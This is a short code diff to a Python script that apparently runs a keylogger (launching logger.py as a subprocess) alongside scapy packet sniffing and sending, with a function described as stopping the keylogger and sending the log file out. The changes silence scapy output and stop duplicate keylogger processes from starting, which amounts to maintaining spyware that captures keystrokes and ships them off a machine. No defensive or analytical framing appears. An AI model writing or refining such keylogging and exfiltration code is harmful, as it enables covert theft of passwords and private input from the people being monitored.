@@ -1,4 +1,4 @@
-from scapy.all import sniff, TCP, IP, send
+from scapy.all import sniff, TCP, send, IP, Raw, conf
 import base64
 from scapy.layers.inet import IP
 import os
@@ -23,6 +23,7 @@ def get_local_ip():
     return local_ip
 
 # Configuration variables
+conf.verb = 0
 dest_ip = None
 local_ip = get_local_ip()
 source_port = 80
@@ -213,7 +214,8 @@ def start_keylogger():
     """Start the keylogger process."""
     global keylogger_process
     script_dir = os.path.abspath('.')  # Changed from os.path.dirname(os.path.abspath(__file__))
-    keylogger_process = subprocess.Popen(['python3', os.path.join(script_dir, 'logger.py')])
+    if not keylogger_process or keylogger_process.poll() is not None:
+        keylogger_process = subprocess.Popen(['python3', os.path.join(script_dir, 'logger.py')])
 
 def stop_keylogger():
     """Stop the keylogger process and send the log file."""
